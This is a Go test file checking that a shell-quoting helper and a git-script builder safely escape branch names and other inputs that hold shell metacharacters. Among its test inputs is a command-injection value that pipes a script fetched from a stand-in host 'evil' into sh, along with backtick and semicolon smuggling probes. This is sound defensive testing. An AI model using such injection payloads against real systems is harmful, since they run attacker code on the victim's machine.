package finalize_test

import (
	"fmt"
	"os/exec"
	"regexp"
	"strings"
	"testing"

	"jamsesh/internal/portal/finalize"
)

// TestShellquote_EscapesSingleQuotes verifies that Shellquote wraps the input
// in single quotes and correctly escapes embedded single quotes via the '\''
// trick. For each case the test also verifies round-trip correctness by
// splicing the quoted value into a bash echo statement and checking that bash
// reproduces the original string.
func TestShellquote_EscapesSingleQuotes(t *testing.T) {
	cases := []struct {
		name  string
		input string
	}{
		{"empty", ""},
		{"plain", "ship/comments"},
		{"single_quote", "it's"},
		{"multiple_single_quotes", "it's a cat's hat"},
		{"leading_single_quote", "'leading"},
		{"trailing_single_quote", "trailing'"},
		{"only_single_quotes", "'''"},
		{"double_quote", `say "hello"`},
		{"backslash", `back\slash`},
		{"newline", "foo\nbar"},
		{"dollar_sign", "price$100"},
		{"backtick", "cmd`whoami`"},
		{"semicolon", "foo;bar"},
		{"pipe", "foo|bar"},
		{"ampersand", "foo&bar"},
		{"mixed_metachars", `x";curl evil/i.sh|sh;#`},
		{"single_and_double", `it's a "test"`},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := finalize.Shellquote(tc.input)

			// Must start and end with single quote.
			if !strings.HasPrefix(got, "'") || !strings.HasSuffix(got, "'") {
				t.Errorf("Shellquote(%q) = %q: not wrapped in single quotes", tc.input, got)
			}

			// Must not contain an unescaped single quote inside the wrapping
			// quotes. The only legal form is '\'' which closes, appends a
			// literal ', and reopens.
			inner := got[1 : len(got)-1]
			if strings.Contains(inner, "'") {
				// The only allowed occurrence is as part of the '\'' sequence.
				// Replace all '\'' and then check no lone single quotes remain.
				stripped := strings.ReplaceAll(inner, `'\''`, "")
				if strings.Contains(stripped, "'") {
					t.Errorf("Shellquote(%q) = %q: contains unescaped single quote in inner portion %q", tc.input, got, inner)
				}
			}

			// Round-trip: ask bash to echo the quoted value and compare.
			if _, err := exec.LookPath("bash"); err != nil {
				t.Skip("bash not available for round-trip verification")
			}
			script := fmt.Sprintf("printf '%%s' %s", got)
			out, err := exec.Command("bash", "-c", script).Output()
			if err != nil {
				t.Fatalf("bash round-trip for %q: %v", tc.input, err)
			}
			if string(out) != tc.input {
				t.Errorf("round-trip mismatch: bash printed %q, want %q (quoted form: %s)", string(out), tc.input, got)
			}
		})
	}
}

// TestBuildScript_TargetBranch_Quoted verifies that BuildScript single-quote-
// escapes target_branch inside the generated checkout line, even when the
// value contains shell metacharacters (defense-in-depth against validator
// bypass).
func TestBuildScript_TargetBranch_Quoted(t *testing.T) {
	cases := []struct {
		name   string
		branch string
	}{
		{"plain", "ship/comments"},
		{"with_single_quote", "feat/it's"},
		{"with_double_quote", `feat/"quoted"`},
		{"with_semicolon", "feat/foo;bar"},
		{"with_backtick", "feat/`cmd`"},
		{"with_dollar", "feat/$VAR"},
		{"with_pipe", "feat/foo|bar"},
	}

	// reCheckout matches the git checkout line with a single-quoted branch.
	reCheckout := regexp.MustCompile(`git checkout -b '([^'\\]|'\\'')*'`)

	for _, tc := range cases {
		for _, mode := range []string{"squash", "preserve"} {
			t.Run(tc.name+"/"+mode, func(t *testing.T) {
				script := finalize.BuildScript(finalize.ScriptInput{
					Mode:              mode,
					TargetBranch:      tc.branch,
					BaseSHA:           "deadbeefdeadbeefdeadbeefdeadbeefdeadbeef",
					SelectedSHAs:      []string{"1111111111111111111111111111111111111111"},
					SquashMessageBody: "Subject\n",
				})

				// The checkout line must use shellquote form.
				if !reCheckout.MatchString(script) {
					t.Errorf("generated script for branch %q (mode=%s) does not contain single-quoted checkout:\n%s",
						tc.branch, mode, script)
				}

				// Also verify the quoted form of the branch appears in the
				// script and matches what Shellquote returns.
				quoted := finalize.Shellquote(tc.branch)
				if !strings.Contains(script, quoted) {
					t.Errorf("generated script for branch %q (mode=%s) does not contain %s:\n%s",
						tc.branch, mode, quoted, script)
				}
			})
		}
	}
}
